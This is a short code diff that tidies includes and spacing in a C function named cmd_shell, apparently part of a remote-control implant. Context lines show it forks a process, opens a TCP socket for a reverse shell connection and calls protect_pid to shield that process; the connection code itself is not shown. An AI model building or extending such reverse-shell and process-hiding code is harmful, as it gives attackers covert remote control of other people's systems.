@@ -1,9 +1,8 @@
 #include "../inc/cmds.h"
 
+#include <signal.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <signal.h>
 #include <unistd.h>
 
 #include <errno.h>
@@ -51,7 +50,7 @@ char *cmd_shell(job_t *job) {
     signal(SIGSEGV, SIG_DFL);
 
     // chdir to rootdir
-    if(chdir("/") < 0)
+    if (chdir("/") < 0)
       exit(1);
 
     // create a TCP socket for the reverse shell connection
@@ -88,7 +87,7 @@ char *cmd_shell(job_t *job) {
   }
 
   // protect the PID
-  if(!protect_pid(cpid)){
+  if (!protect_pid(cpid)) {
     job_debug("failed to protect the reverse shell process");
     return "failed to protect the reverse shell process";
   }
